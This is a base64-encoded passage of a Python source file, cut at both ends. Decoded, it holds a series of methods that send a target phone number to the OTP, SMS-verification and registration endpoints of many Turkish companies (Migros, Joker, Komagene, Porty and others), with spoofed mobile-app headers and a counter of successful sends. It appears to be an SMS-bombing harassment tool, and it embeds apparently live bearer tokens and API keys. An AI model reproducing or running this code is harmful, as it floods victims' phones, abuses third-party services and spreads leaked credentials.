gogICAgICAgIHRyeToKICAgICAgICAgICAgdXJsID0gImh0dHBzOi8vcmVzdC5taWdyb3MuY29tLnRyOjQ0My9oZW1lbi91c2Vycy9sb2dpbi9vdHAiCiAgICAgICAgICAgIGhlYWRlcnMgPSB7IkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIiwgIlgtRGV2aWNlLVBsYXRmb3JtIjogIklPUyIsCiAgICAgICAgICAgICAgICAgICAgICAgIlgtUmVxdWVzdC1JZGVudGlmaWVyIjogIjYwNTlGMDI3LUY2QkMtNDFBOS05M0U2LTc3RkIzODhEQTE5QiIsICJBY2NlcHQiOiAiKi8qIiwKICAgICAgICAgICAgICAgICAgICAgICAiWC1EZXZpY2UtTW9kZWwiOiAiaVBob25lIDcgUGx1cyIsICJYLVN0b3JlLUlkcyI6ICIiLCAiWC1EZXZpY2UtVmVyc2lvbiI6ICIxMC41LjIiLAogICAgICAgICAgICAgICAgICAgICAgICJBY2NlcHQtTGFuZ3VhZ2UiOiAiZW4tVVMsZW47cT0wLjkiLCAiQWNjZXB0LUVuY29kaW5nIjogImd6aXAsIGRlZmxhdGUiLAogICAgICAgICAgICAgICAgICAgICAgICJYLURldmljZS1QbGF0Zm9ybS1WZXJzaW9uIjogIjE1LjcuNyIsCiAgICAgICAgICAgICAgICAgICAgICAgIlVzZXItQWdlbnQiOiAiTWlncm9zLzE2OTAgQ0ZOZXR3b3JrLzEzMzUuMC4zLjIgRGFyd2luLzIxLjYuMCIsCiAgICAgICAgICAgICAgICAgICAgICAgIlgtRGV2aWNlLUlkZW50aWZpZXIiOiAiREEzOTFGRDYtNzI5OS00QTRFLUEzNUUtMUQzMDkwNTQ3NTgyIiwgIlgtRGV2aWNlLUxhdGl0dWRlIjogIiIsCiAgICAgICAgICAgICAgICAgICAgICAgIlgtRGV2aWNlLUxvbmdpdHVkZSI6ICIiLCAiWC1EZXZpY2UtVHlwZSI6ICJNT0JJTEUifQogICAgICAgICAgICBqc29uID0geyJwaG9uZU51bWJlciI6IHNlbGYucGhvbmV9CiAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KHVybCwgaGVhZGVycz1oZWFkZXJzLCBqc29uPWpzb24pCiAgICAgICAgICAgIGlmIHIuanNvbigpWyJzdWNjZXNzZnVsIl0gPT0gVHJ1ZToKICAgICAgICAgICAgICAgIHByaW50KGYie0ZvcmUuTElHSFRHUkVFTl9FWH1bK10ge1N0eWxlLlJFU0VUX0FMTH1CYcWfYXLEsWzEsSEge3NlbGYucGhvbmV9IC0tPiByZXN0Lm1pZ3Jvcy5jb20udHIiKQogICAgICAgICAgICAgICAgc2VsZi5hZGV0ICs9IDEKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHJhaXNlCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBwcmludChmIntGb3JlLkxJR0hUUkVEX0VYfVstXSB7U3R5bGUuUkVTRVRfQUxMfUJhxZ9hcsSxc8SxeiEge3NlbGYucGhvbmV9IC0tPiByZXN0Lm1pZ3Jvcy5jb20udHIiKQoKICAgICMgZmlsZS5jb20udHIKICAgIGRlZiBGaWxlKHNlbGYpOgogICAgICAgIHRyeToKICAgICAgICAgICAgdXJsID0gImh0dHBzOi8vYXBpLmZpbGVtYXJrZXQuY29tLnRyOjQ0My92MS9vdHAvc2VuZCIKICAgICAgICAgICAgaGVhZGVycyA9IHsiQWNjZXB0IjogIiovKiIsICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIsCiAgICAgICAgICAgICAgICAgICAgICAgIlVzZXItQWdlbnQiOiAiZmlsZW1hcmtldC8yMDIyMDYwMTIwMDEzIENGTmV0d29yay8xMzM1LjAuMy4yIERhcndpbi8yMS42LjAiLCAiWC1PcyI6ICJJT1MiLAogICAgICAgICAgICAgICAgICAgICAgICJYLVZlcnNpb24iOiAiMS43IiwgIkFjY2VwdC1MYW5ndWFnZSI6ICJlbi1VUyxlbjtxPTAuOSIsICJBY2NlcHQtRW5jb2RpbmciOiAiZ3ppcCwgZGVmbGF0ZSJ9CiAgICAgICAgICAgIGpzb24gPSB7Im1vYmlsZVBob25lTnVtYmVyIjogZiI5MHtzZWxmLnBob25lfSJ9CiAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KHVybCwgaGVhZGVycz1oZWFkZXJzLCBqc29uPWpzb24pCiAgICAgICAgICAgIGlmIHIuanNvbigpWyJyZXNwb25zZVR5cGUiXSA9PSAiU1VDQ0VTUyI6CiAgICAgICAgICAgICAgICBwcmludChmIntGb3JlLkxJR0hUR1JFRU5fRVh9WytdIHtTdHlsZS5SRVNFVF9BTEx9QmHFn2FyxLFsxLEhIHtzZWxmLnBob25lfSAtLT4gYXBpLmZpbGVtYXJrZXQuY29tLnRyIikKICAgICAgICAgICAgICAgIHNlbGYuYWRldCArPSAxCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICByYWlzZQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgcHJpbnQoZiJ7Rm9yZS5MSUdIVFJFRF9FWH1bLV0ge1N0eWxlLlJFU0VUX0FMTH1CYcWfYXLEsXPEsXohIHtzZWxmLnBob25lfSAtLT4gYXBpLmZpbGVtYXJrZXQuY29tLnRyIikKCiAgICAjIHJvb21iYWRpLmNvbQogICAgZGVmIFJvb21iYWRpKHNlbGYpOgogICAgICAgIHRyeToKICAgICAgICAgICAgdXJsID0gImh0dHBzOi8vYXBpLnJvb21iYWRpLmNvbTo0NDMvYXBpL3YyL2F1dGgvb3RwL2F1dGhlbnRpY2F0ZSIKICAgICAgICAgICAgaGVhZGVycyA9IHsiQWNjZXB0IjogImFwcGxpY2F0aW9uL2pzb24sIHRleHQvcGxhaW4sICovKiIsICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIsCiAgICAgICAgICAgICAgICAgICAgICAgIkFjY2VwdC1FbmNvZGluZyI6ICJnemlwLCBkZWZsYXRlIiwKICAgICAgICAgICAgICAgICAgICAgICAiVXNlci1BZ2VudCI6ICJSb29tYmFkaS8zIENGTmV0d29yay8xMzM1LjAuMy4yIERhcndpbi8yMS42LjAiLCAiQWNjZXB0LUxhbmd1YWdlIjogImVuLHRyIn0KICAgICAgICAgICAganNvbiA9IHsiY291bnRyeUlkIjogMiwgInBob25lIjogc2VsZi5waG9uZX0KICAgICAgICAgICAgciA9IHJlcXVlc3RzLnBvc3QodXJsLCBoZWFkZXJzPWhlYWRlcnMsIGpzb249anNvbikKICAgICAgICAgICAgaWYgci5qc29uKClbInJlbWFpbmluZ1RpbWUiXSA9PSAxMjA6CiAgICAgICAgICAgICAgICBwcmludChmIntGb3JlLkxJR0hUR1JFRU5fRVh9WytdIHtTdHlsZS5SRVNFVF9BTEx9QmHFn2FyxLFsxLEhIHtzZWxmLnBob25lfSAtLT4gYXBpLnJvb21iYWRpLmNvbSIpCiAgICAgICAgICAgICAgICBzZWxmLmFkZXQgKz0gMQogICAgICAgICAgICBlbHNlOgogICAgICAgICAgICAgICAgcmFpc2UKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHByaW50KGYie0ZvcmUuTElHSFRSRURfRVh9Wy1dIHtTdHlsZS5SRVNFVF9BTEx9QmHFn2FyxLFzxLF6ISB7c2VsZi5waG9uZX0gLS0+IGFwaS5yb29tYmFkaS5jb20iKQoKICAgICMgZ295YWtpdC5jb20udHIKICAgIGRlZiBHbyhzZWxmKToKICAgICAgICB0cnk6CiAgICAgICAgICAgIHVybCA9ICJodHRwczovL2dvbW9iaWxhcHAuaXByYWdhei5jb20udHI6NDQzL2FwaS92MS8wL2F1dGhlbnRpY2F0aW9uL2o5NHMtZzU5IgogICAgICAgICAgICBoZWFkZXJzID0geyJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbiIsICJBY2NlcHQiOiAiKi8qIiwgIkF1dGhvcml6YXRpb24iOiAiIiwKICAgICAgICAgICAgICAgICAgICAgICAiQWNjZXB0LUVuY29kaW5nIjogImd6aXAsIGRlZmxhdGUiLCAiSWYtTm9uZS1NYXRjaCI6ICJXL1wiNGItOWJWSzFMTzdvcllpeG9Sc0NxeVJkTVAxVDlzXCIiLAogICAgICAgICAgICAgICAgICAgICAgICJBY2NlcHQtTGFuZ3VhZ2UiOiAiZW4tVFI7cT0xLjAsIHRyLVRSO3E9MC45IiwKICAgICAgICAgICAgICAgICAgICAgICAiU3VyZnRva2VuIjogImV5SmhiR2NpT2lKSVV6STFOaUlzSW5SNWNDSTZJa3BYVkNKOS5leUprWlhacFkyVkpaQ0k2SWpSR04wVkNOVVpETFRORU1VTXRORVV6UlMwNU1FWkNMVUl4TXprM1F6RXhPVGd5UWlJc0ltbGhkQ0k2TVRZNU1EY3hOVFkzTXl3aVpYaHdJam94Tmprek16QTNOamN6ZlEuMlpRVkNvZzZQLWxjTVI4WFZZeldHZUxrVEtBUUhIYkNibnBoamd6WUkyQyIsCiAgICAgICAgICAgICAgICAgICAgICAgIlVzZXItQWdlbnQiOiAiaXByYWdhemdvLzIuMi43IChjb20uaXByYWVuZXJqaS5nbzsgYnVpbGQ6MTsgaU9TIDE1LjcuNykgQWxhbW9maXJlLzUuNy4xIiwKICAgICAgICAgICAgICAgICAgICAgICAiUmVmcmVzaHRva2VuIjogIiIsICJDb25uZWN0aW9uIjogImNsb3NlIn0KICAgICAgICAgICAganNvbiA9IHsiaXNSZWdpc3RlcmVkIjogRmFsc2UsICJwaG9uZSI6IHNlbGYucGhvbmV9CiAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KHVybCwgaGVhZGVycz1oZWFkZXJzLCBqc29uPWpzb24pCiAgICAgICAgICAgIGlmIHIuanNvbigpWyJkYXRhIl1bInN1Y2Nlc3MiXSA9PSBUcnVlOgogICAgICAgICAgICAgICAgcHJpbnQoZiJ7Rm9yZS5MSUdIVEdSRUVOX0VYfVsrXSB7U3R5bGUuUkVTRVRfQUxMfUJhxZ9hcsSxbMSxISB7c2VsZi5waG9uZX0gLS0+IGdvbW9iaWxhcHAuaXByYWdhei5jb20udHIiKQogICAgICAgICAgICAgICAgc2VsZi5hZGV0ICs9IDEKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHJhaXNlCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBwcmludChmIntGb3JlLkxJR0hUUkVEX0VYfVstXSB7U3R5bGUuUkVTRVRfQUxMfUJhxZ9hcsSxc8SxeiEge3NlbGYucGhvbmV9IC0tPiBnb21vYmlsYXBwLmlwcmFnYXouY29tLnRyIikKCiAgICAjIGpva2VyLmNvbS50cgogICAgZGVmIEpva2VyKHNlbGYpOgogICAgICAgIHRyeToKICAgICAgICAgICAgdXJsID0gImh0dHBzOi8vYXBpLmpva2VyLmNvbS50cjo0NDMvYXBpL3JlZ2lzdGVyIgogICAgICAgICAgICBoZWFkZXJzID0geyJBY2NlcHQiOiAiKi8qIiwgIkNvbnRlbnQtVHlwZSI6ICJhcHBsaWNhdGlvbi9qc29uIiwKICAgICAgICAgICAgICAgICAgICAgICAiQXV0aG9yaXphdGlvbiI6ICJCZWFyZXIgZXlKMGVYQWlPaUpLVjFRaUxDSmhiR2NpT2lKU1V6STFOaUo5LmV5SnBZWFFpT2pFMk9UQTNNVFkxTWpFc0ltVjRjQ0k2TVRZNU5Ua3dNRFV5TVN3aWRYTmxjbTVoYldVaU9pSkhWVVZUVkRFMk9UQTNNVFkxTWpFek16QTNNemRBYW05clpYSXVZMjl0TG5SeUlpd2laM1ZsYzNRaU9uUnlkV1Y5LlRhUUE4WkR0bVUwOWVGcU9GQVRTOHViWE00QkhQUUxfQmNnZUVvcVpmdU5aY2ZqZkxfeHpxUk83ZlplaHpXekVkakhYTlhlQ1VUZGp4NzZFeVZCLWIzVEZ1TDNPYWhtcmJlYU9JQ0Q4TVhjaGhNRHY3OFRGaFd6T0o5QWQtTW1hNlFQU2NTU1ZMMHBZb1FIV1JoemFlT2ttVmV5cHFZaVFLR21PRWs5TnpmT1Z4RFlQYTI1aUptZXRpYWIxWl9iOTVIcXQ1Q2xzNTJWN2c0cEdXbWJqWUIzZ3llVVFuNUlJNm5lS04xNzR0eHAxeWFHZHJOUFl3QWtfYVJKem9BTUExU2lzWm00cmhqZEVfOU1leUd3amJnazJvYlB4RVZjd3ZQUHdrZDU2X2EzNGFET2VvNnJBdm5nR0FMQlBXbFM4OW5mSEZiNlBVMmZLeUs3alRhVmxDMERpVm5vamxrQ19Lem9IY3B0TTdTalFCeW00Qm45Q1haNGtqMkoxT20tZGhEeW1ReW5TQ2ZtUTNKWlFkN24xWWRRWVlNdUFvVGJqZ2haaHlQdTJTQ3RsSTdhbzZKaFVVY210TzNmaklpeVlnQWRnRC1GRGNxU0dBczlpNWZuM2tDaWRTa3U1TTRsanExb3ZKTTRCZWFOZVFkRlhxRV9XcXVycE9lTEE5NWZOdW1HQ29YdkpHbExoUzVWek1kRlQtbDNjZmRQdDBWMFdtdGpKRFJwVG5vc2pnZml6eDRGNXFmdGxWdUY5OHVvRm9leGc3bFFZSHlaLWo0NTUtZDVCMjRfV2ZVOEdDalFodGxEVnRTVGNNaVJ2VUtFakotR2xtNXN5djVWVmJSN21KeHU2NFNCMkoyZFBiSGNJazZCUXVGWVhJSmtsTjdHWHhEYThtU25FWmRzIiwKICAgICAgICAgICAgICAgICAgICAgICAiQWNjZXB0LUVuY29kaW5nIjogImd6aXAsIGRlZmxhdGUiLAogICAgICAgICAgICAgICAgICAgICAgICJVc2VyLUFnZW50IjogIkpva2VyLzQuMC4xNCAoY29tLmpva2VyLmFwcDsgYnVpbGQ6MjsgaU9TIDE1LjcuNykgQWxhbW9maXJlLzUuNC4zIiwKICAgICAgICAgICAgICAgICAgICAgICAiQWNjZXB0LUxhbmd1YWdlIjogImVuLVRSO3E9MS4wLCB0ci1UUjtxPTAuOSIsICJDb25uZWN0aW9uIjogImNsb3NlIn0KICAgICAgICAgICAganNvbiA9IHsiZmlyc3ROYW1lIjogIk1lbWF0aSIsICJnZW5kZXIiOiAibSIsICJpb3NWZXJzaW9uIjogIjQuMC4yIiwgImxhc3ROYW1lIjogIkJhcyIsICJvcyI6ICJJT1MiLAogICAgICAgICAgICAgICAgICAgICJwYXNzd29yZCI6ICIzMUFCQy4uYWJjMzEiLCAicGhvbmVOdW1iZXIiOiBmIjB7c2VsZi5waG9uZX0iLCAidXNlcm5hbWUiOiBzZWxmLm1haWx9CiAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KHVybCwgaGVhZGVycz1oZWFkZXJzLCBqc29uPWpzb24pCiAgICAgICAgICAgIGlmIHIuanNvbigpWyJtZXNzYWdlIl0gPT0gIkRvxJ9ydWxhbWEga29kdSBnw7ZuZGVyaWxkaS4iOgogICAgICAgICAgICAgICAgcHJpbnQoZiJ7Rm9yZS5MSUdIVEdSRUVOX0VYfVsrXSB7U3R5bGUuUkVTRVRfQUxMfUJhxZ9hcsSxbMSxISB7c2VsZi5waG9uZX0gLS0+IGFwaS5qb2tlci5jb20udHIiKQogICAgICAgICAgICAgICAgc2VsZi5hZGV0ICs9IDEKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHJhaXNlCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBwcmludChmIntGb3JlLkxJR0hUUkVEX0VYfVstXSB7U3R5bGUuUkVTRVRfQUxMfUJhxZ9hcsSxc8SxeiEge3NlbGYucGhvbmV9IC0tPiBhcGkuam9rZXIuY29tLnRyIikKCiAgICAjIGFrLWFzeWEuY29tLnRyCiAgICBkZWYgQWthc3lhKHNlbGYpOgogICAgICAgIHRyeToKICAgICAgICAgICAgdXJsID0gImh0dHBzOi8vYWthc3lhLWFkbWluLnBvaWxhYnMuY29tL3YxL3RyL3NtcyIKICAgICAgICAgICAganNvbiA9IHsicGhvbmUiOiBzZWxmLnBob25lfQogICAgICAgICAgICBoZWFkZXJzID0geyJ4LXBsYXRmb3JtLXRva2VuIjogIjMxMzEzMSJ9CiAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KHVybD11cmwsIGhlYWRlcnM9aGVhZGVycywganNvbj1qc29uKQogICAgICAgICAgICBpZiByLmpzb24oKVsicmVzdWx0Il0gPT0gIlNNUyBzZW5kZWQgc3VjY2VzZnVsbHkhIjoKICAgICAgICAgICAgICAgIHByaW50KGYie0ZvcmUuTElHSFRHUkVFTl9FWH1bK10ge1N0eWxlLlJFU0VUX0FMTH1CYcWfYXLEsWzEsSEge3NlbGYucGhvbmV9IC0tPiBha2FzeWEtYWRtaW4ucG9pbGFicy5jb20iKQogICAgICAgICAgICAgICAgc2VsZi5hZGV0ICs9IDEKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHJhaXNlCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBwcmludChmIntGb3JlLkxJR0hUUkVEX0VYfVstXSB7U3R5bGUuUkVTRVRfQUxMfUJhxZ9hcsSxc8SxeiEge3NlbGYucGhvbmV9IC0tPiBha2FzeWEtYWRtaW4ucG9pbGFicy5jb20iKQoKICAgICMgYWtiYXRpLmNvbQogICAgZGVmIEFrYmF0aShzZWxmKToKICAgICAgICB0cnk6CiAgICAgICAgICAgIHVybCA9ICJodHRwczovL2FrYmF0aS1hZG1pbi5wb2lsYWJzLmNvbS92MS90ci9zbXMiCiAgICAgICAgICAgIGpzb24gPSB7InBob25lIjogc2VsZi5waG9uZX0KICAgICAgICAgICAgaGVhZGVycyA9IHsieC1wbGF0Zm9ybS10b2tlbiI6ICIzMTMxMzEifQogICAgICAgICAgICByID0gcmVxdWVzdHMucG9zdCh1cmw9dXJsLCBoZWFkZXJzPWhlYWRlcnMsIGpzb249anNvbikKICAgICAgICAgICAgaWYgci5qc29uKClbInJlc3VsdCJdID09ICJTTVMgc2VuZGVkIHN1Y2Nlc2Z1bGx5ISI6CiAgICAgICAgICAgICAgICBwcmludChmIntGb3JlLkxJR0hUR1JFRU5fRVh9WytdIHtTdHlsZS5SRVNFVF9BTEx9QmHFn2FyxLFsxLEhIHtzZWxmLnBob25lfSAtLT4gYWtiYXRpLWFkbWluLnBvaWxhYnMuY29tIikKICAgICAgICAgICAgICAgIHNlbGYuYWRldCArPSAxCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICByYWlzZQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgcHJpbnQoZiJ7Rm9yZS5MSUdIVFJFRF9FWH1bLV0ge1N0eWxlLlJFU0VUX0FMTH1CYcWfYXLEsXPEsXohIHtzZWxmLnBob25lfSAtLT4gYWtiYXRpLWFkbWluLnBvaWxhYnMuY29tIikKCiAgICAjIGNsaWNrbWVsaXZlLmNvbQogICAgZGVmIENsaWNrbWUoc2VsZik6CiAgICAgICAgdHJ5OgogICAgICAgICAgICB1cmwgPSAiaHR0cHM6Ly9kZXYtYXp1cmUtbW9iaWxlLWFwaS5jbGlja21lbGl2ZS5jb206NDQzL2FwaS92MS9hdXRob3JpemF0aW9uL2NvZGUiCiAgICAgICAgICAgIGhlYWRlcnMgPSB7IkF1dGhvcml6YXRpb24iOiAiYXBpS2V5IDYxNzE5NmZjNjVkYzA3NzhmYjU5ZTk3NjYwODU2ZDE5MjFiZWY1YTA5MmJiNDA3MWYzYzA3MTcwNGU1Y2E0Y2MiLAogICAgICAgICAgICAgICAgICAgICAgICJDbGllbnQtVmVyc2lvbiI6ICIxLjAuNDQiLCAiQ2xpZW50LURldmljZSI6ICJJT1MiLCAiQWNjZXB0LUxhbmd1YWdlIjogImVuLVVTLGVuO3E9MC45IiwKICAgICAgICAgICAgICAgICAgICAgICAiQWNjZXB0LUVuY29kaW5nIjogImd6aXAsIGRlZmxhdGUiLAogICAgICAgICAgICAgICAgICAgICAgICJVc2VyLUFnZW50IjogIkNsaWNrTWVMaXZlLzg1IENGTmV0d29yay8xMzM1LjAuMy40IERhcndpbi8yMS42LjAifQogICAgICAgICAgICBqc29uID0geyJwaG9uZSI6IHNlbGYucGhvbmV9CiAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KHVybD11cmwsIGpzb249anNvbiwgaGVhZGVycz1oZWFkZXJzKQogICAgICAgICAgICBpZiByLmpzb24oKVsiaXNTdWNjZXNzIl0gPT0gVHJ1ZToKICAgICAgICAgICAgICAgIHByaW50KAogICAgICAgICAgICAgICAgICAgIGYie0ZvcmUuTElHSFRHUkVFTl9FWH1bK10ge1N0eWxlLlJFU0VUX0FMTH1CYcWfYXLEsWzEsSEge3NlbGYucGhvbmV9IC0tPiBkZXYtYXp1cmUtbW9iaWxlLWFwaS5jbGlja21lbGl2ZS5jb20iKQogICAgICAgICAgICAgICAgc2VsZi5hZGV0ICs9IDEKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHJhaXNlCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBwcmludCgKICAgICAgICAgICAgICAgIGYie0ZvcmUuTElHSFRSRURfRVh9Wy1dIHtTdHlsZS5SRVNFVF9BTEx9QmHFn2FyxLFzxLF6ISB7c2VsZi5waG9uZX0gLS0+IGRldi1henVyZS1tb2JpbGUtYXBpLmNsaWNrbWVsaXZlLmNvbSIpCgogICAgIyBoYXBweS5jb20udHIKICAgIGRlZiBIYXBweShzZWxmKToKICAgICAgICB0cnk6CiAgICAgICAgICAgIHVybCA9ICJodHRwczovL3d3dy5oYXBweS5jb20udHI6NDQzL2luZGV4LnBocD9yb3V0ZT1hY2NvdW50L3JlZ2lzdGVyL3ZlcmlmeVBob25lIgogICAgICAgICAgICBoZWFkZXJzID0geyJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkOyBjaGFyc2V0PVVURi04IiwKICAgICAgICAgICAgICAgICAgICAgICAiQWNjZXB0IjogImFwcGxpY2F0aW9uL2pzb24sIHRleHQvamF2YXNjcmlwdCwgKi8qOyBxPTAuMDEiLCAiWC1SZXF1ZXN0ZWQtV2l0aCI6ICJYTUxIdHRwUmVxdWVzdCIsCiAgICAgICAgICAgICAgICAgICAgICAgIkFjY2VwdC1MYW5ndWFnZSI6ICJlbi1VUyxlbjtxPTAuOSIsICJBY2NlcHQtRW5jb2RpbmciOiAiZ3ppcCwgZGVmbGF0ZSIsCiAgICAgICAgICAgICAgICAgICAgICAgIk9yaWdpbiI6ICJodHRwczovL3d3dy5oYXBweS5jb20udHIiLAogICAgICAgICAgICAgICAgICAgICAgICJVc2VyLUFnZW50IjogIk1vemlsbGEvNS4wIChpUGhvbmU7IENQVSBpUGhvbmUgT1MgMTVfN184IGxpa2UgTWFjIE9TIFgpIEFwcGxlV2ViS2l0LzYwNS4xLjE1IChLSFRNTCwgbGlrZSBHZWNrbykiLAogICAgICAgICAgICAgICAgICAgICAgICJSZWZlcmVyIjogImh0dHBzOi8vd3d3LmhhcHB5LmNvbS50ci9pbmRleC5waHA/cm91dGU9YWNjb3VudC9yZWdpc3RlciJ9CiAgICAgICAgICAgIGRhdGEgPSB7InRlbGVwaG9uZSI6IHNlbGYucGhvbmV9CiAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KHVybD11cmwsIGRhdGE9ZGF0YSwgaGVhZGVycz1oZWFkZXJzKQogICAgICAgICAgICBpZiByLnN0YXR1c19jb2RlID09IDIwMDoKICAgICAgICAgICAgICAgIHByaW50KGYie0ZvcmUuTElHSFRHUkVFTl9FWH1bK10ge1N0eWxlLlJFU0VUX0FMTH1CYcWfYXLEsWzEsSEge3NlbGYucGhvbmV9IC0tPiBoYXBweS5jb20udHIiKQogICAgICAgICAgICAgICAgc2VsZi5hZGV0ICs9IDEKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHJhaXNlCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBwcmludChmIntGb3JlLkxJR0hUUkVEX0VYfVstXSB7U3R5bGUuUkVTRVRfQUxMfUJhxZ9hcsSxc8SxeiEge3NlbGYucGhvbmV9IC0tPiBoYXBweS5jb20udHIiKQoKICAgICMga29tYWdlbmUuY29tLnRyCiAgICBkZWYgS29tYWdlbmUoc2VsZik6CiAgICAgICAgdHJ5OgogICAgICAgICAgICB1cmwgPSAiaHR0cHM6Ly9nYXRld2F5LmtvbWFnZW5lLmNvbS50ci9hdXRoL2F1dGgvc21za29kdWdvbmRlciIKICAgICAgICAgICAganNvbiA9IHsiVGVsZWZvbiI6IHNlbGYucGhvbmUsICJGaXJtYUlkIjogIjMyIn0KICAgICAgICAgICAgaGVhZGVycyA9IHsKICAgICAgICAgICAgICAgICJ1c2VyLWFnZW50IjogIk1vemlsbGEvNS4wIChpUGhvbmU7IENQVSBpUGhvbmUgT1MgMTVfN184IGxpa2UgTWFjIE9TIFgpIEFwcGxlV2ViS2l0LzYwNS4xLjE1IChLSFRNTCwgbGlrZSBHZWNrbykifQogICAgICAgICAgICByID0gcmVxdWVzdHMucG9zdCh1cmw9dXJsLCBoZWFkZXJzPWhlYWRlcnMsIGpzb249anNvbikKICAgICAgICAgICAgaWYgci5qc29uKClbIlN1Y2Nlc3MiXSA9PSBUcnVlOgogICAgICAgICAgICAgICAgcHJpbnQoZiJ7Rm9yZS5MSUdIVEdSRUVOX0VYfVsrXSB7U3R5bGUuUkVTRVRfQUxMfUJhxZ9hcsSxbMSxISB7c2VsZi5waG9uZX0gLS0+IGdhdGV3YXkua29tYWdlbmUuY29tLnRyIikKICAgICAgICAgICAgICAgIHNlbGYuYWRldCArPSAxCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICByYWlzZQogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgcHJpbnQoZiJ7Rm9yZS5MSUdIVFJFRF9FWH1bLV0ge1N0eWxlLlJFU0VUX0FMTH1CYcWfYXLEsXPEsXohIHtzZWxmLnBob25lfSAtLT4gZ2F0ZXdheS5rb21hZ2VuZS5jb20udHIiKQoKICAgICMga3VyeWVtZ2Vsc2luLmNvbQogICAgZGVmIEt1cnllbUdlbHNpbihzZWxmKToKICAgICAgICB0cnk6CiAgICAgICAgICAgIHVybCA9ICJodHRwczovL2FwaS5rdXJ5ZW1nZWxzaW4uY29tOjQ0My9lbi9hcGkvdXNlcnMvcmVnaXN0ZXJNZXNzYWdlLyIKICAgICAgICAgICAganNvbiA9IHsicGhvbmVOdW1iZXIiOiBzZWxmLnBob25lLCAicGhvbmVfY291bnRyeV9jb2RlIjogIis5MCJ9CiAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KHVybD11cmwsIGpzb249anNvbikKICAgICAgICAgICAgaWYgci5zdGF0dXNfY29kZSA9PSAyMDA6CiAgICAgICAgICAgICAgICBwcmludChmIntGb3JlLkxJR0hUR1JFRU5fRVh9WytdIHtTdHlsZS5SRVNFVF9BTEx9QmHFn2FyxLFsxLEhIHtzZWxmLnBob25lfSAtLT4gYXBpLmt1cnllbWdlbHNpbi5jb20iKQogICAgICAgICAgICAgICAgc2VsZi5hZGV0ICs9IDEKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHJhaXNlCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBwcmludChmIntGb3JlLkxJR0hUUkVEX0VYfVstXSB7U3R5bGUuUkVTRVRfQUxMfUJhxZ9hcsSxc8SxeiEge3NlbGYucGhvbmV9IC0tPiBhcGkua3VyeWVtZ2Vsc2luLmNvbSIpCgogICAgIyBwb3J0eS50ZWNoCiAgICBkZWYgUG9ydHkoc2VsZik6CiAgICAgICAgdHJ5OgogICAgICAgICAgICB1cmwgPSAiaHR0cHM6Ly9wYW5lbC5wb3J0eS50ZWNoOjQ0My9hcGkucGhwPyIKICAgICAgICAgICAgaGVhZGVycyA9IHsiQWNjZXB0IjogIiovKiIsICJDb250ZW50LVR5cGUiOiAiYXBwbGljYXRpb24vanNvbjsgY2hhcnNldD1VVEYtOCIsCiAgICAgICAgICAgICAgICAgICAgICAgIkFjY2VwdC1FbmNvZGluZyI6ICJnemlwLCBkZWZsYXRlIiwgIkFjY2VwdC1MYW5ndWFnZSI6ICJlbi1VUyxlbjtxPTAuOSIsCiAgICAgICAgICAgICAgICAgICAgICAgIlVzZXItQWdlbnQiOiAiUG9ydHkvMSBDRk5ldHdvcmsvMTMzNS4wLjMuNCBEYXJ3aW4vMjEuNi4wIiwKICAgICAgICAgICAgICAgICAgICAgICAiVG9rZW4iOiAicTJ6UzZrWDdXWUZSd1ZZQXJEZE02Nng3MmRSNmhuWkFTWiJ9CiAgICAgICAgICAgIGpzb24gPSB7ImpvYiI6ICJzdGFydF9sb2dpbiIsICJwaG9uZSI6IHNlbGYucGhvbmV9CiAgICAgICAgICAgIHIgPSByZXF1ZXN0cy5wb3N0KHVybD11cmwsIGpzb249anNvbiwgaGVhZGVycz1oZWFkZXJzKQogICAgICAgICAgICBpZiByLmpzb24oKVsic3RhdHVzIl0gPT0gInN1Y2Nlc3MiOgogICAgICAgICAgICAgICAgcHJpbnQoZiJ7Rm9yZS5MSUdIVEdSRUVOX0VYfVsrXSB7U3R5bGUuUkVTRVRfQUxMfUJhxZ9hcsSxbMSxISB7c2VsZi5waG9uZX0gLS0+IHBhbmVsLnBvcnR5LnRlY2giKQogICAgICAgICAgICAgICAgc2VsZi5hZGV0ICs9IDEKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHJhaXNlCiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBwcmludChmIntGb3JlLkxJR0hUUkVEX0VYfVstXSB7U3R5bGUuUkVTRVRfQUxMfUJhxZ9hcsSxc8SxeiEge3NlbGYucGhvbmV9IC0tPiBwYW5lbC5